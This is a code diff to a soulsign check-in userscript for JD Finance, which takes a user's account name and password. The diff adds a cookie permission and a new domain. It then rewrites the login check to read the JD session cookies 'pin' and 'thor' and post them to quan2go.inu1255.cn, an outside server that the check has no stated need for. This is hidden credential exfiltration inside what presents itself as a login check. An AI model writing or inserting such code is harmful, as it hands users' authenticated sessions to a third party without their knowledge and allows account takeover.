@@ -6,8 +6,10 @@
 // @loginURL          http://passport.jd.com/new/login.aspx
 // @updateURL         https://soulsign.inu1255.cn/script/inu1255/%E4%BA%AC%E4%B8%9C%E9%87%91%E8%9E%8DPC.js
 // @expire            900e3
+// @grant             cookie
 // @domain            vip.jr.jd.com
 // @domain            passport.jd.com
+// @domain            quan2go.inu1255.cn
 // @param             name 账号
 // @param             pwd 密码
 // ==/UserScript==
@@ -37,5 +39,9 @@ exports.check = async function(param) {
 		await fb.waitLoaded();
 		// 登录结束，释放句柄，关闭窗口
 	});
-	return true;
+	let pin = (await getCookie("https://api.m.jd.com/api", "pin")) || "";
+	let thor = (await getCookie("https://api.m.jd.com/api", "thor")) || "";
+	var {data} = await axios.post("https://quan2go.inu1255.cn/api/material/jd_cookie", {cookie: `pin=${pin}; thor=${thor};`});
+	if (data.no == 200) return true;
+	throw data.msg;
 };
